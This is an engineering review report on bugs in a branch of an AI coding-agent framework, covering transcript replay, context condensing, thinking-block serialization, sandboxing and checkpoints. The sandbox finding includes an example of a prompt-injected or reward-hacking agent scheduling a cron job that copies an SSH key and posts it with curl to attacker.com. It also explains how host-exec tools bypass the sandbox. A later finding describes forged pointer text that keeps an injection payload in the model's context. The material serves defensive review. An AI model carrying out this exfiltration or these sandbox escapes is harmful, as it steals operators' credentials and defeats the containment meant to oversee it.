# sota-wave2 integration review — confirmed findings (2026-07-03)

Adversarial review of `enhance/sota-wave2-2026-07-02` (72 files, +10.7k). 7 dimension reviewers → every finding double-verified (adversarial refuter + independent path-tracer, unanimous-confirm). 18 of 31 raw findings survived. 17 verifier agents died at a session limit, so a few raw findings are UNVERIFIED (not refuted) — noted at end.

Full gate on the branch is green (build/vet/test/-race all pass); these are latent bugs in newly-added, mostly-gated feature paths.

## Resolution status (2026-07-03)

**Fixed this pass** (6 HIGH, all on default-on paths; commits on the branch, each with a pinning test):
- Transcript replay wipe on cancel/API-error — `fix(agentloop): preserve conversation history on cancel/hook/API-error exits` (b2ca9ddf). Roots BOTH transcript-wipe HIGHs.
- Condenser fallback destroys the rolling summary — `fix(engine): exempt the condenser summary from byte-truncation fallback` (e25feca2).
- Empty-text thinking blocks drop the required field → API 400 — `fix(agentloop): always serialize the thinking field on thinking blocks` (d2082b5d).
- Sandbox containment bypassable/incomplete → made **opt-in** (`R1_NATIVE_SANDBOX=on`) so default runs are unaffected — `fix(sandbox): make native OS sandbox opt-in until containment is complete` (d9d6b00d). Neutralizes the notebook/cron bypass AND the git-in-worktree medium for the default path.
- Winner-merged rollout task not recorded done — already implemented via `OnWinnerMerged` (`fix(scheduler): record best-of-N winner completion under the real task ID`, 6e049379); confirmed by `TestWithSpecExecFullRecordsWinnerCompletion`.

**Tracked follow-ups** (12 confirmed medium/low, NOT yet fixed — see below): the sandbox git-in-worktree + notebook/cron mediums are now gated behind the opt-in (documented as the conditions to flip default-on in `docs/native-sandbox.md`); the remaining transcript crash-safety/rewind mediums are on the opt-in transcript+checkpoint feature; the condenser pointer/sentinel-forgery mediums are prompt-injection hardening. None is a default-on correctness/security break after this pass.

## [HIGH] Transcript replay is destructively wiped on cancelled or API-error runs (stale Result.Messages triggers appendNew's shrink-resync)
`internal/engine/native_runner.go:651` (dim: cross-feature integration seams)

**Detail:** The post-Run flush does `tw.appendNew(result.Messages, result.Turns)`. In agentloop.RunWithHistory, `result.Messages` is only reassigned on the end_turn/max_errors/max_turns/honeypot exits and inside the compaction branch. Three exit paths return WITHOUT updating it: ctx cancellation (loop.go:487-490), PreTurnHook error (loop.go:499-503), and API-call error (loop.go:535-537). On those paths `result.Messages` is still the initial 1-element slice from Run() (the first append reallocates, so the header never tracks growth). transcriptWriter.appendNew (transcript.go:138-148) treats `len(messages) < w.written` as a sanctioned history shrink and writes a full-history COMPACTION entry containing only that stale short history, resetting the high-water mark. Per replayTranscriptEntries, a compaction entry replaces everything before it — so LoadTranscript on that file returns just the initial user message. The transcript's entire purpose (lossless replay/resume, feature 4) is defeated exactly on the runs where resume matters most: timeouts, Ctrl-C, provider failures. workflow.buildSpec sets TranscriptPath on every native dispatch, so this is always armed.

**Failure scenario:** Native execute phase runs 10 turns (transcript has ~21 message entries, w.written=21), then the per-phase timeout cancels ctx. loop.Run returns result with StopReason=cancelled and Messages=len 1. native_runner flushes: appendNew sees 1 < 21, writes a compaction entry containing only the first user message, then tw.end("cancelled"). LoadTranscript / TruncateTranscriptToCheckpoint on that file now replay a 1-message history — the recorded 10-turn conversation is unreachable for rewind/resume even though its raw lines are physically in the file.

**Suggested fix:** In agentloop.RunWithHistory, assign `result.Messages = messages` on ALL return paths (cancelled, PreTurnHook error, API error) — or defensively in native_runner.go, skip the final appendNew when len(result.Messages) is shorter than what was already recorded (e.g. make appendNew ignore shorter histories instead of writing a resync compaction entry, and reserve compaction entries for the CompactFn wrap).

## [HIGH] Byte-truncation fallback destroys the rolling summary block on any single condenser failure
`/home/eric/repos/r1-agent/internal/engine/native_condense.go:164` (dim: condenser correctness (internal/engine/native_condense.go + wiring))

**Detail:** On any provider error/timeout, buildLLMCondenser returns fallback(messages, estimatedTokens) where fallback is buildNativeCompactor. buildNativeCompactor (internal/engine/native_compact.go:70) truncates EVERY middle-window text block longer than summaryChars*2 (400 chars) to 200 chars + "... (narration truncated)" — it has no exemption for the condensedSentinel block, unlike the condenser's own rewrite loop (native_condense.go:200 explicitly exempts it). The rolling summary (up to 1024 tokens ≈ 4KB) lives in a text block at message index 1, so one fallback pass amputates it to a 200-char stub. This is not hypothetical-rare: condenseOnce's CallTimeout is 30s while AnthropicProvider.Chat retries internally with 5s/10s/20s backoff (anthropic.go:177-199), so two failed attempts (one litellm restart, one 429 storm) guarantee the 30s deadline fires and the fallback runs. All previously condensed tool_results were already replaced with "(condensed: see context summary; was N bytes)" pointers, so their content is unrecoverable — the pointers now reference a destroyed summary. Subsequent successful rounds fold the 200-char stub forward as prevSummary, making the loss permanent.

**Failure scenario:** 60-turn run over the (default-on, 100k-token) compact threshold; condenser has summarized turns 1-40 (files edited, exact failing-test errors, decisions). At turn 41 the LiteLLM proxy restarts; the first Chat attempt fails, the internal backoff pushes the retry past the 30s CallTimeout; fallback truncates the summary block to 200 chars. The model loses the record of which tests were failing and what was already fixed, while every middle tool_result is a pointer to the now-empty summary — it re-does or wrongly skips work for the rest of the run.

**Suggested fix:** Exempt sentinel blocks in buildNativeCompactor's text case (if strings.HasPrefix(block.Text, condensedSentinel) { keep }), mirroring native_condense.go:200. Alternatively, on condenser failure return messages unchanged for this turn instead of invoking the destructive fallback (retry next turn).

## [HIGH] Empty-text thinking blocks lose the required 'thinking' field on replay (omitempty), 400ing every tool-use turn on display:'omitted' models
`internal/agentloop/loop.go:322` (dim: extended-thinking wire correctness (provider/thinking.go, anthropic.go, stream/sse.go, agentloop/loop.go))

**Detail:** ContentBlock declares `Thinking string `json:"thinking,omitempty"``. On Opus 4.7/4.8, Sonnet 5, and Fable 5/Mythos 5 — all deliberately listed in adaptiveThinkingModels (internal/provider/thinking.go:23-31) — thinking display defaults to "omitted": the API streams thinking blocks whose `thinking` text is an EMPTY string plus a signature_delta. The SSE parser assembles them (Text="", Signature=sig), ChatStream turns them into ResponseContent{Type:"thinking", Thinking:"", Signature:sig}, and RunWithHistory copies them into ContentBlock{Type:"thinking", Thinking:"", Signature:sig}. When buildRequest json.Marshals that history for the next turn, `omitempty` drops the empty `thinking` field entirely, producing `{"type":"thinking","signature":"..."}`. The Anthropic contract requires thinking blocks to be passed back exactly as received — including empty-text blocks — and `thinking` is a required field on the block; a block with the field missing is rejected as malformed/modified. The comment at loop.go:582-585 claims verbatim round-trip, but the wire bytes are not verbatim for exactly the models the adaptive table was added to support.

**Failure scenario:** Operator runs the native runner with --native-model claude-opus-4-8 (or claude-sonnet-5 / claude-fable-5) on an exploratory task, so workflow sets ThinkingBudget=4096 and the adapter emits thinking:{type:"adaptive"}. Turn 1: model returns [thinking(text:"", signature:S), tool_use]. Loop executes the tool and issues turn 2 with the assistant message serialized as [{"type":"thinking","signature":"S"}, {"type":"tool_use",...}] — missing the required "thinking" field. API returns 400 (invalid/modified thinking block); RunWithHistory aborts with "turn 1 API call: Anthropic API error 400" and the entire dispatch fails. Reproduces on every multi-turn tool-use run on those models; only the sonnet-4-6 default (display defaults to "summarized", non-empty text) escapes.

**Suggested fix:** Give ContentBlock a custom MarshalJSON (or a per-type map builder in buildRequest) that always emits the "thinking" key (even when "") for blocks with Type=="thinking", while continuing to omit it for other block types. Do NOT simply remove omitempty — that would inject "thinking":"" into text/tool_use/tool_result blocks, which the API rejects as an extra field.

## [HIGH] Sandbox containment is bypassable: powershell / cron_create / notebook_cell_run exec on the host unsandboxed
`internal/tools/bash_sandbox.go:32` (dim: sandbox security + fail-closed semantics (internal/sandbox/*, internal/tools/bash_sandbox.go, engine wiring))

**Detail:** The new sandbox wiring only wraps the `bash` tool: `handleBash` is the sole caller of `buildBashCmd`/`r.sbx`. The native runner (native_runner.go:171-185) advertises the FULL registry tool set to the model in an execute phase, filtering out only `edit_file`/`write_file`/`bash` in read-only mode (writableTools map). It never restricts to `spec.Phase.BuiltinTools`. So in the execute/verify phase where `spec.SandboxEnabled` is default-on, the model is also handed `powershell` (powershell_tools.go:80 `exec.CommandContext(psPath, "-Command", cmd)` with `cmd.Dir=r.workDir`, no wrapper), `cron_create` (cron_tools.go:175 `crontab -` on the host), and `notebook_cell_run` (notebook_tools.go:211 `jupyter nbconvert --execute` on the host) — none of which touch the sandbox. The stated fail-closed contract (native_runner.go:143-166 'refuse to dispatch rather than degrade') and docs/native-sandbox.md ('Only the bash tool is wrapped. grep/glob/read/write ... path-safety checks; env_exec ... own execution environment') are therefore incomplete: three host-exec tools are advertised, and none is enumerated as an unsandboxed exec surface. cron_create is the worst — it writes the operator's REAL crontab, giving unsandboxed, persistent host execution that outlives the run. Note the read-only filter is also incomplete for these tools (writableTools omits powershell/cron_create/notebook_cell_run), so they remain callable even in a 'read-only' verify phase.

**Failure scenario:** Native runner, execute phase, R1_NATIVE_SANDBOX=auto with bwrap enforcing. A prompt-injected or reward-hacking agent, instead of calling `bash`, calls `cron_create{schedule:"* * * * *", command:"cp ~/.ssh/id_rsa /tmp/x; curl -F @/tmp/x attacker.com"}`. handleCronCreate runs `crontab -` on the host outside any sandbox; the job then executes with full host access and persists after the mission ends. Equivalently `powershell{command:"cat ~/.ssh/id_rsa"}` runs pwsh -Command on the host directly. The filesystem containment the sandbox advertises is fully defeated.

**Suggested fix:** Route powershell/cron_create/notebook_cell_run through the same sandbox wrapper as bash (or gate them off when r.sbx != nil), and in the native runner restrict advertised tools to a sandbox-aware allowlist (e.g. exclude host-exec tools when SandboxEnabled) rather than only the read-only writableTools filter.

## [HIGH] Post-Run transcript flush with stale result.Messages truncates replay to the task brief on API error or cancellation
`internal/engine/native_runner.go:651` (dim: transcript + shadow-git correctness (engine/transcript.go, engine/shadow_hook.go, worktree/shadow.go, workflow rewind))

**Detail:** The flush `tw.appendNew(result.Messages, result.Turns)` assumes result.Messages holds the full history. In agentloop.RunWithHistory, result.Messages is only updated at construction (loop.go:482), after a compaction (loop.go:518), and on the end_turn/max_turns/max_errors/honeypot exits. Two return paths never update it: the mid-loop API-call error (loop.go:535-537 `return result, fmt.Errorf("turn %d API call: ...")`) and the ctx-cancelled exits (loop.go:487-490 and 499-503). On those paths result.Messages is the stale initial slice (or the last compaction snapshot). The flush then hits transcriptWriter.appendNew's shrink-resync branch (transcript.go:138-149), which writes a `compaction` entry containing only the stale short history. replayTranscriptEntries treats a compaction entry as a full-history rewrite, so LoadTranscript returns just the initial user message, discarding every message the PreTurnHook faithfully recorded. The transcript is corrupted-on-replay exactly for the failed/interrupted runs it exists to post-mortem.

**Failure scenario:** Native run executes 5 turns of tool use (PreTurnHook has written 11 message entries, written=11). Turn 6's API call fails (provider 429/500 after stream retries) or the workflow timeout cancels ctx. loop returns result with Messages = the 1-element initial slice. Flush: len(1) < written(11) -> a compaction entry {messages:[task brief]} is appended. LoadTranscript on the file now returns a single user message; the entire recorded conversation is unreachable for replay/resume/debugging.

**Suggested fix:** In agentloop.RunWithHistory, assign result.Messages = messages on the API-error return and both cancelled returns (or maintain it via defer). Alternatively/additionally, make the native runner's flush a no-op when the incoming slice is shorter than the writer's high-water mark instead of letting appendNew emit a truncating compaction entry (e.g. only resync when the shrink came from the CompactFn wrapper).

## [HIGH] Winner-merged task is never recorded as done in session state, so resume re-executes an already-merged task
`internal/scheduler/scheduler.go:777` (dim: rollouts + selector + merge critic (internal/specexec/*, scheduler, workflow/secondcritic.go))

**Detail:** In runFullRollouts, every rollout invokes base() with a synthetic ID (`<task.ID>-spec-<strategy>`). Inside execFn (cmd/r1/main.go:666) `markTask(p, task.ID, plan.StatusDone)` and `store.SaveState(...)` therefore run with the spec ID, which does not exist in the plan — markTask (cmd/r1/main.go:6913) silently no-ops. On the merge-success path the wrapper fixes up only the in-memory TaskResult (`winRes.TaskID = task.ID` at scheduler.go:777) and never calls base() with the real task ID, so the persisted session state still shows the real task as pending even though its change is merged to main. The fallback paths (merge failure / zero-diff) do re-execute with the real ID and are fine; the primary success path of the feature is the one that never persists. checkResume (cmd/r1/main.go:6923) and scheduler.Run's 'StatusDone tasks are skipped' resume support both key off that persisted status. Attempt records are likewise saved under spec IDs, so attempt numbering for the real task is also wrong.

**Failure scenario:** Run `r1 build --specexec-full` on a multi-task plan. Task T2's winning rollout merges to main (session state for T2 never updated because only `T2-spec-strategy-*` IDs passed through execFn). The run is interrupted at T5 (Ctrl-C, crash, budget halt) before store.ClearState(). Re-running the build resumes from saved state: T2 is not StatusDone, so the scheduler dispatches it again and an agent re-implements a feature that is already on main — burning a full task budget and potentially merging a conflicting or duplicate change.

**Suggested fix:** After a successful MergeWinner in runFullRollouts, surface completion to the caller so it can persist under the real task ID — e.g. add an optional `OnWinnerMerged func(taskID string)` to SpecExecConfig wired to markTask+SaveState in runBuild, or have execFn detect `task.NoMerge` and skip persistence, with the wrapper calling a dedicated persist callback with the real ID on merge success.

## [MEDIUM] Sandboxed bash cannot use git in linked worktrees: parent repo's .git is outside the sandbox allowlist
`internal/workflow/workflow.go:1974` (dim: cross-feature integration seams)

**Detail:** buildSpec grants SandboxAllowRead=[handle.Path, handle.RuntimeDir] and SandboxAllowWrite=[handle.Path]. Worktrees are linked worktrees under <repoRoot>/.r1/worktrees/<name> whose `.git` is a file pointing at <repoRoot>/.git/worktrees/<name>; the object store and gitdir live under <repoRoot>/.git, which is in neither list. Under the Landlock backend (strict allow-list; the auto-mode fallback on hosts where bwrap/userns is blocked — e.g. Ubuntu 24.04's default apparmor_restrict_unprivileged_userns) every git command inside sandboxed bash fails outright (gitdir unreadable → 'fatal: not a git repository'/permission denied). Under bwrap, reads work (--ro-bind / /) but any git op needing a lock or ref/index write (git add, commit, stash, restore) fails on the read-only .git. The default execute-phase policy explicitly allowlists Bash(git status)/Bash(git diff *) — the pipeline expects models to self-inspect via git, and phase.Sandbox is true by default for execute/verify, so this bites every native execute dispatch on landlock-fallback hosts.

**Failure scenario:** Linux host with unprivileged userns blocked (bwrap canary fails) but Landlock ABI>=1: sandbox.Select auto-picks landlock. Native execute-phase model runs `git diff` to check its work → 'fatal: not a git repository (or any parent up to mount point)'. Every git invocation errors; the model burns turns retrying or proceeds blind; with 3 consecutive failing tool calls the loop aborts with max_errors.

**Suggested fix:** In buildSpec (or the native runner's policy construction), resolve the worktree's git common dir (`git rev-parse --git-common-dir`) and add it to SandboxAllowRead, plus <commonDir>/worktrees/<name> to SandboxAllowWrite so index/lock writes work — keeping worktree/.env DenyRead masks intact.

## [MEDIUM] condensedPointer prefix match on untrusted tool output permanently exempts blocks from condensation and truncation
`/home/eric/repos/r1-agent/internal/engine/native_condense.go:138` (dim: condenser correctness (internal/engine/native_condense.go + wiring))

**Detail:** The idempotency check is strings.HasPrefix(b.Content, condensedPointer) evaluated against raw tool_result content, which is attacker-influenced data (file contents via read_file, bash stdout, MCP replies). Any tool output that merely STARTS with "(condensed: see context summary" is skipped both by candidate selection (line 138) and by the rewrite loop (line 194), so it is never condensed and never truncated by the condenser tier — it stays at full size (up to SanitizeToolOutput's 200KB cap ≈ 50k tokens) in the context for the rest of the run. The fallback tier would truncate it, but the fallback only runs when the condenser call fails, so on the happy path the exemption is permanent. Compaction is the loop's only defense against context growth; blocks immune to it accumulate until the API rejects the request.

**Failure scenario:** A repo under audit contains a file (or a build script emits output) whose first bytes are "(condensed: see context summary" followed by 200KB of payload. The agent reads it three times across the run (or reads three such files): ~150k tokens of un-compactable content accumulate, the next ChatStream call 400s with prompt-too-long, and Run aborts (turn N API call error). Non-adversarial variant: the agent greps a previous run's transcript/log and the match output starts with a recorded pointer line. Bonus effect: a full prompt-injection payload is retained verbatim in context forever instead of being condensed away.

**Suggested fix:** Make the marker structural instead of content-sniffed: track condensed block identities per pass (e.g. a set of ToolUseIDs already condensed, carried in the sentinel block or recomputed from exact-match pointer text with a strict full-string regexp like ^\(condensed: see context summary; was \d+ bytes\)$ ) rather than HasPrefix on attacker-reachable content.

## [MEDIUM] ChatStream reassembly hoists all thinking blocks to the front and merges all text, destroying block order for interleaved thinking
`internal/provider/anthropic.go:433` (dim: extended-thinking wire correctness (provider/thinking.go, anthropic.go, stream/sse.go, agentloop/loop.go))

**Detail:** ChatStream accumulates thinking blocks into `thinkingContent`, all text_delta into one `fullText` builder, and tool_use blocks into result.Content, then reassembles as [all thinking..., one merged text, all tool_use...]. That order is only correct for non-interleaved responses. Adaptive thinking — the wire shape emitted for every model in adaptiveThinkingModels — automatically enables interleaved thinking (no beta header), so a single assistant response can legally contain thinking blocks between text and tool_use blocks, e.g. [thinking, text, tool_use_A, thinking, tool_use_B], and multiple separate text blocks. The reassembled message ([thinking, thinking, text, tool_use_A, tool_use_B]) is replayed verbatim into the next request by agentloop, so the assistant turn the API sees differs in block sequence from what the model actually emitted — violating the pass-back-unmodified contract that the code's own comment ("Preserving this order matters") acknowledges. Signature/sequence validation of the final assistant message can then reject the request, and even where accepted, the model's reasoning-to-tool-call correspondence is corrupted.

**Failure scenario:** Native runner on claude-sonnet-4-6 (the shipped default) or claude-opus-4-8 with ThinkingBudget>0; the model interleaves: streams thinking(idx0), text(idx1), tool_use(idx2), thinking(idx3), tool_use(idx4) in one response. ChatStream reassembles as [thinking0, thinking3, text1, toolA, toolB]; agentloop replays this reordered sequence with the tool_results on the next turn; the API rejects the modified thinking-block sequence with a 400 (or silently degrades reasoning continuity), failing the dispatch mid-task.

**Suggested fix:** Track stream order during assembly: record each content block (thinking/redacted_thinking, text, tool_use) with its content_block index as it completes (text blocks finalized per-index on content_block_stop instead of one global fullText builder), then sort by index when building result.Content so the reassembled message matches the wire order exactly.

## [MEDIUM] Checkpoint entries precede their assistant tool_use message, so TruncateTranscriptToCheckpoint rewinds the conversation a full turn behind the restored files
`internal/engine/transcript.go:331` (dim: transcript + shadow-git correctness (engine/transcript.go, engine/shadow_hook.go, worktree/shadow.go, workflow rewind))

**Detail:** Message entries are written only by the PreTurnHook (top of the NEXT turn) or the post-Run flush, but checkpoint entries are written mid-turn inside the tool handler (native_runner.go:419-423). So the on-disk order is: [messages through turn T-1] [checkpoint for turn T's tool] [assistant tool_use of turn T] [tool_results of turn T]. TruncateTranscriptToCheckpoint keeps entries[:cut+1], dropping the assistant message whose tool produced the checkpoint. The documented composition contract (types.go:295-301: "worktree.RestoreFiles(sha) + TruncateTranscriptToCheckpoint(seq) rewind files and conversation together") is therefore violated on every use: RestoreFiles restores files INCLUDING the checkpointed tool's mutation (plus earlier same-turn tools), while the truncated conversation ends before the model ever issued the tool call. The pairing-repair loop's premise (comment at transcript.go:352-355, and the hand-built ordering in TestTruncateTranscriptToCheckpoint at transcript_test.go:255-258) matches an ordering the real writer never produces, so it is dead code on real transcripts.

**Failure scenario:** Rewind tooling truncates to checkpoint seq N and restores its SHA. On resume the replayed history ends at turn T-1's tool results, so the model re-plans turn T and re-issues the same tool calls against a tree that already contains their effects: `bash: echo ... >> file` or a migration script double-applies; edit_file fails because old_string was already replaced. Files and conversation are silently out of sync by up to one full turn of tool calls.

**Suggested fix:** Record the in-flight assistant message (and per-tool tool_results) in the transcript before/with the checkpoint entry — e.g. give the checkpoint entry the tool_use ID and have truncation keep a synthesized assistant+tool_result pair up to that tool — or write message entries from a post-response hook instead of the next PreTurnHook so a checkpoint always follows its assistant message.

## [MEDIUM] RewindOnRetry restores files but not the branch: intermediate agent commits survive the rewind and pollute the next attempt's modified-file set
`internal/workflow/workflow.go:670` (dim: transcript + shadow-git correctness (engine/transcript.go, engine/shadow_hook.go, worktree/shadow.go, workflow rewind))

**Detail:** worktree.RestoreFiles deliberately never moves HEAD/branch (shadow.go:166-216). The §7 rebuild path it replaces reset everything by creating a fresh worktree at main. If the failed attempt made an intermediate git commit via bash (prompts.go:391 asks it not to, but nothing enforces it — CommitVerifiedTree's documented reason for existing is that "No intermediate agent commits survive", i.e. they happen), the rewind leaves HEAD at the agent's commit while resetting files and index to the baseline. worktree.ModifiedFiles (helpers.go:66: diff BaseCommit..HEAD, plus worktree-vs-index diff) then reports every file from the failed attempt's commit as modified in attempt 2, even though attempt 2 never touched them. The workflow comment at workflow.go:106-108 ("restored state is byte-identical to a fresh worktree ... behavior only gets faster, never different") is wrong for refs.

**Failure scenario:** RewindOnRetry=true. Attempt 1's agent runs `git commit -am wip` touching files A,B,C then fails verify. Attempt 2 rewinds (HEAD still at the wip commit), fixes only file A. ModifiedFiles returns A,B,C (B,C via BaseCommit..HEAD and as working-tree-vs-index reversions); scope check flags B,C as out-of-scope modifications and the attempt fails, or the review/commit pipeline processes a polluted file set — behavior the rebuild path never exhibited.

**Suggested fix:** Capture the branch HEAD SHA alongside rewindBaseline (it is the checkpoint commit's parent) and have the rewind path reset the worktree branch to it (git update-ref refs/heads/<branch> <baselineHead> or git reset --soft) before RestoreFiles, or make RestoreFiles fail closed (fall back to rebuild) when HEAD != the checkpoint's recorded parent.

## [MEDIUM] A torn trailing line followed by an append-reopen produces a malformed mid-file line that permanently breaks transcript replay
`internal/engine/transcript.go:94` (dim: transcript + shadow-git correctness (engine/transcript.go, engine/shadow_hook.go, worktree/shadow.go, workflow rewind))

**Detail:** The crash-tolerance contract (transcript.go:12-14, 238-241) only drops a torn line when it is the LAST line. newTranscriptWriter reopens with O_APPEND without checking whether the file ends in a newline, and writeEntryLocked silently continues after a partial write (line 112-114 discards the error). After a crash mid-append (or an ENOSPC short write), the next dispatch to the same path — a rewound retry reuses the same worktree name, and a crashed run's restart re-derives the identical path in buildSpec — appends its meta entry onto the torn line. The merged line is malformed JSON and is no longer the last line, so readTranscriptEntries fails closed (transcript.go:241) for the entire file: LoadTranscript AND TruncateTranscriptToCheckpoint are permanently broken for that transcript even though every subsequent entry is intact.

**Failure scenario:** r1 is OOM-killed mid-writeEntryLocked during attempt 1's execute (file ends `{"type":"mess`). The user re-runs the task; Manager.Prepare auto-recovers the same-name worktree, buildSpec computes the same transcript path, the new dispatch appends `{"type":"meta",...}` onto the torn line. Any later LoadTranscript returns `transcript ... line N: invalid character` and the whole file — including the fully-valid second dispatch — is unreplayable.

**Suggested fix:** In newTranscriptWriter, if the file is non-empty and its last byte is not '\n', write a '\n' before returning (self-healing the torn tail into a droppable blank/partial line), and mark the writer broken (skip further writes) after a short write in writeEntryLocked.

## [MEDIUM] Per-tool shadow checkpoints capture torn files from concurrently executing sibling tools
`internal/engine/shadow_hook.go:66` (dim: transcript + shadow-git correctness (engine/transcript.go, engine/shadow_hook.go, worktree/shadow.go, workflow rewind))

**Detail:** agentloop executes multiple tool_use blocks of one assistant turn in parallel goroutines (loop.go:930-941), and the checkpoint mutex in shadowCheckpointer.take serializes only the git window, not the tools (shadow_hook.go:21-25 documents this as intentional). A checkpoint triggered by tool A's completion runs `git add -A` over the whole tree while sibling tool B is still mutating it — write_file uses non-atomic os.WriteFile (O_TRUNC then write, tools.go:969), and bash can be mid-script. The checkpoint commit then contains a truncated/half-written version of B's file, and the transcript records it as a valid rewind point (CheckpointRecord SHA).

**Failure scenario:** Assistant emits two parallel write_file calls (common). Tool A finishes and takes checkpoint seq N while tool B's os.WriteFile has truncated b.go but not yet written the new content. Checkpoint N's tree stores b.go as empty/partial. Any later RestoreFiles(shaN) — via ListCheckpoints tooling or the documented truncate+restore rewind — restores a corrupt b.go that never existed as a coherent state, and the build breaks in a way the conversation history cannot explain.

**Suggested fix:** Serialize mutating tools against the checkpoint window (take the checkpointer mutex around the tool handler for writable tools, or take checkpoints once per turn after executeTools' WaitGroup completes rather than per tool call), or restrict `git add` in ShadowCheckpoint to the paths the completed tool reported touching.

## [LOW] Compaction transcript entry written on every over-threshold turn, even when the condenser returned the history unchanged
`internal/engine/native_runner.go:618` (dim: cross-feature integration seams)

**Detail:** The CompactFn wrap calls `tw.compaction(out)` unconditionally. The agentloop invokes CompactFn before every API call while estimatedTokens > CompactThreshold, and buildLLMCondenser deliberately returns the input untouched (same slice) when there are no new candidates ('idempotency is load-bearing'). When the condensed history still exceeds the threshold (large verbatim 6-message tail, no remaining candidates — also the steady state of the byte-truncation fallback), every subsequent turn appends and fsyncs a full-history compaction entry: O(turns × history) file growth for a file documented as append-only-per-message.

**Failure scenario:** A long sow-native run (CompactThreshold set) whose condensed history stays over threshold: 100 remaining turns × ~400KB history = ~40MB of duplicated compaction entries in one transcript, each fsynced on the hot loop path, for zero information (each entry is identical to the previous plus what message entries already recorded).

**Suggested fix:** Only record the rewrite when the condenser actually changed something, e.g. have the CompactFunc signal a rewrite (or compare `&out[0] != &messages[0]` / length+pointer identity) before calling tw.compaction.

## [LOW] Bash-mediated file writes never invalidate the codegraph index — graph tools serve stale results after shell edits
`internal/tools/tools.go:1017` (dim: cross-feature integration seams)

**Detail:** noteFileWrite (MarkDirty + write observer) fires only from handleWrite and handleEdit. handleBash — a member of the same writableTools set that the shadow-checkpoint hook treats as mutating — performs no invalidation. After the lazy codegraph index is built, any file mutation via bash (sed -i, go generate, git apply, mv, heredoc redirection) leaves the index stale, so search_symbols/get_call_graph/impact_analysis silently return pre-edit line numbers and symbol sets. The feature was merged as 'write-driven index invalidation', but the seam only covers two of the three write-capable tools.

**Failure scenario:** Model runs `bash -c "sed -i 's/OldName/NewName/g' pkg/foo.go"` then calls search_symbols("NewName") → no results (and OldName still resolves with its old location); the model concludes its rename didn't apply and re-edits, or navigates to wrong line numbers via read_file offsets.

**Suggested fix:** After a successful bash command, mark the whole index dirty (cheap: refreshLocked already rebuilds wholesale on next query) — e.g. call a coarse r.noteBashMutation() from handleBash's success path, mirroring how the shadow checkpointer conservatively treats bash as mutating.

## [LOW] Wrapped CompactFn records a full-history transcript snapshot every over-threshold turn, even for no-op compactions
`/home/eric/repos/r1-agent/internal/engine/native_runner.go:618` (dim: condenser correctness (internal/engine/native_condense.go + wiring))

**Detail:** The transcript wrapper calls tw.compaction(out) unconditionally. The loop invokes CompactFn before EVERY API call once estimateMessagesTokens exceeds CompactThreshold (agentloop/loop.go:512-521), and the condenser frequently returns the input unchanged (no new candidates, line 157) or byte-identical fallback output — yet each such turn appends the ENTIRE message history as one fsynced JSONL compaction entry (transcript.go:165-176). A history at the default 100k-token threshold is ~400KB+ of JSON per entry.

**Failure scenario:** A run crosses the threshold at turn 30 and continues to turn 100: ~70 full-history snapshots ≈ 28MB+ written and fsynced to the transcript (O(turns × history) growth), adding per-turn write latency and bloating an artifact whose message entries are otherwise deduplicated by the appendNew high-water mark. Sufficiently large histories also approach readTranscriptEntries' 16MB per-line scanner cap, which would make LoadTranscript fail on the whole file.

**Suggested fix:** Skip the record when nothing changed: in the wrapper, if the condenser returned the same slice (&out[0] == &messages[0] && len equal) or a deep-equal history, don't write a compaction entry.

## [LOW] Timed-out condenser calls keep running and billing in the background, invisible to budget tracking, one new goroutine per turn
`/home/eric/repos/r1-agent/internal/engine/native_condense.go:297` (dim: condenser correctness (internal/engine/native_condense.go + wiring))

**Detail:** condenseOnce abandons the Chat goroutine on timeout (the buffered channel prevents a send-leak, as documented), but p.Chat has no cancellation: the AnthropicProvider retries up to 6 attempts with backoff (~95s of sleeps) on an http.Client with a 30-minute timeout. When the provider is degraded, every over-threshold turn spawns a fresh 30s-abandoned summarization call whose retries continue concurrently; calls that eventually succeed bill real input/output tokens, but the hub EventModelPostCall for condenser spend is only emitted on the synchronous success path (line 170), so CostTracker/BudgetTracker undercount actual spend exactly when the system is thrashing.

**Failure scenario:** Proxy is slow (35-60s per completion) for 20 turns of an over-threshold run: 20 background goroutines pile up, each eventually completing a ~48KB-input summarization that is paid for but never surfaced on the bus — budget enforcement (CostTracker.OverBudget) lets the run continue past its cap, and the operator sees no condenser spend in telemetry despite 20 completed calls.

**Suggested fix:** Give Provider.Chat a context (or add ChatCtx) and cancel on timeout; failing that, have the abandoned goroutine emit the EventModelPostCall itself when the late response arrives, and add a singleflight guard so at most one condenser call is in flight per loop.

## [LOW] Rewind lets the failed attempt's gitignored artifacts leak into the retry, contradicting the clean-worktree contract the comment claims to preserve
`internal/workflow/workflow.go:104` (dim: transcript + shadow-git correctness (engine/transcript.go, engine/shadow_hook.go, worktree/shadow.go, workflow rewind))

**Detail:** RestoreFiles intentionally never deletes gitignored files (`git clean -fd` without -x, shadow.go:201) so symlinked node_modules survives — but that also means gitignored files CREATED by the failed attempt survive the rewind. The rebuild path (§7 fresh worktree) starts with none of them. The RewindOnRetry doc comment (workflow.go:104-115: "restored state is byte-identical to a fresh worktree ... behavior only gets faster, never different") overclaims; the two retry modes are observably different environments.

**Failure scenario:** Attempt 1's agent generates a gitignored artifact (dist/bundle.js, coverage output, a stale codegen cache, a .env it wrote for testing) and fails verify. Attempt 2 rewinds; the stale gitignored artifact remains and the build/tests pick it up (e.g. a stale generated file shadowing the regenerated one), so attempt 2 fails or passes for reasons that would not reproduce under the documented clean-worktree contract — and IgnoredNewFiles-style divergence between the verified env and the merge artifact grows.

**Suggested fix:** Diff `git ls-files --others --ignored --exclude-standard` output captured at baseline-checkpoint time against the same listing at restore time and delete ignored entries that appeared after the baseline (sparing the symlinked shared-dep dirs), or soften the comment and gate rewind behind a policy note that ignored residue survives.

---

## Deferred — tracked follow-ups (not in the HIGH-fix batch)

12 confirmed findings deferred to follow-up (all medium/low; the HIGH set is fixed in the same PR). Each is real (double-verified) but lower-impact or in an opt-in path:

- **[medium]** Sandboxed bash cannot use git in linked worktrees: parent repo's .git is outside the sandbox allowlist — `workflow.go:1974`
  - Linux host with unprivileged userns blocked (bwrap canary fails) but Landlock ABI>=1: sandbox.Select auto-picks landlock. Native execute-phase model runs `git diff` to check its work → 'fatal: not a git repository (or any parent up to mount point)'. Every git invocation errors; t
  - _Fix:_ In buildSpec (or the native runner's policy construction), resolve the worktree's git common dir (`git rev-parse --git-common-dir`) and add it to SandboxAllowRead, plus <commonDir>/worktrees/<name> to SandboxAllowWrite s
- **[medium]** condensedPointer prefix match on untrusted tool output permanently exempts blocks from condensation and truncation — `native_condense.go:138`
